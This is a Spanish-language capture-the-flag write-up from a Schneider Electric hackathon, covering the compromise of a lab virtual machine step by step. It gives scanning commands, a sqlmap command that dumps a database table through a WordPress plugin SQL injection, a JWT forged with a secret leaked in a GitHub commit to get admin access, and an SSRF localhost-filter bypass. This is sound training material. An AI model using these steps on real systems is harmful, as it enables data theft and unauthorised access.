# Schneider Electric Hackathon

WriteUp de Alecks Rodriguez para el Hackaton 

# Archivos

Los archivos necesarios se encuentran aquí: 
[Maquina Virtual para Virtual Box](https://challenges-asset-files.s3.us-east-2.amazonaws.com/cyber/CTF-Schneider-Vbox.zip)
[Maquina Virtual para VMWare](https://s3.console.aws.amazon.com/s3/object/challenges-asset-files?region=us-east-2&prefix=cyber/CTF-Schneider-VMWare.zip)

# Procedimiento General

- Importar Maquina Virtual
- Escanear la red para obtener la ip de la maquina virtual

> netdiscover -i "puerto de internet (eth0, eth1, wlan0)"

- Escanear puertos y servicios
    nmap -sV -A -O -T5 -p- --script vuln  < IP > (En mi caso fue 192.168.100.137)

Noté que hay muchos puertos, pero solo muy pocos me llamaron la atención, como los puertos **80**, **1337** y **5000**
No encontré nada en el puerto 80 de la pagina y en el puerto 5000 aparece la siguiente leyenda: 

    {"text":"There is nothing to see here (I guess)"}

# FLAG{Update_Plugins!}

- Agregar la ip a **/etc/hosts** 
- Entrar a la ip/robots.txt
Despues de entrar a Robots.txt nos aparece la siguiente pagina:

    https://wp.geohome.com
Aqui nos damos cuenta de que es una pagina de WordPress
- Hacer escaneo de WordPress

    wpscan -v --disable-tls-checks --url https://wp.geohome.com/ --api-token < token >

 Se identificaron 4 vulnerabilidades en https://wp.geohome.com/wp-content/plugins/perfect-survey/, el cual nos permite investigar el exploit de la vulnerabilidad:
 

    /admin-ajax.php?action=get_question&question_id=1
Y la pagina se explota cuando se pone todo el enlace completo:

    https://wp.geohome.com/wp-admin/admin-ajax.php?action=get_question&question_id=1
- Usar Sqlmap
> sqlmap -u "https://wp.geohome.com/wp-admin/admin-ajax.php?action=get_question&question_id=1" --threads 3 -D flag -T flag --dump

# FLAG{ALWAYS_CHECK_COMMITS}
- Entrar a la pagina de github:

    https://github.com/geohome-dev/GeoAPI/commit/e82c17ed045e205a2ea07a354ae5b39c8b7d7ea0#

# {"Flag":"API_FLAG{Never_public_your_secret}","Message":"Oh hello again dear Administrator"}

- Entrar a Postman
- Contigurando: 
	POST
	ip:5000/register
	Body: raw: json: {"username":**user**, "password":**pass**}
- Enviar la información (Se habrá creado un usuario con esos datos)
- Configurando:
	POST
	ip:5000/login
	Body: raw: json: {"username":**user**, "password":**pass**}
- Enviar la información 
- Copiar el token que se genere
- Entrar a https://jwt.io/
- Pegar el token en encoded
- En la parte derecha "**payload**" cambiar el dato que tenga la variable "**sub**" por **admin**
- En la parte derecha "**verify signature**" escribir en "**your-256-bit-secret**" "**Ge0HomeIsThePlaceWhereFantasyMeetsReality**" (el cual ha sido copiado del Github)
- Copiar el token generado
- Usar el siguiente comando
    curl http://wp.geohome.com:5000/admin -H "Authorization:Bearer TOKEN"
# FLAG{SSRF_PARA_TOD@S_XD}
- Hacer un wfuzz a la extension "**.php**" usando el worldlist de "**dirb**" llamado "**common.txt**" a la pagina http://wp.geohome.com/FUZZ.php
- Usar la extension "**testsite.php**"
- Bypassear el "**localhost**" con "**locAlhost**" con el puerto **"1337"**
- Usar la direccion: 
http://192.168.100.137/testsite.php?url=http://locAlhost:1337
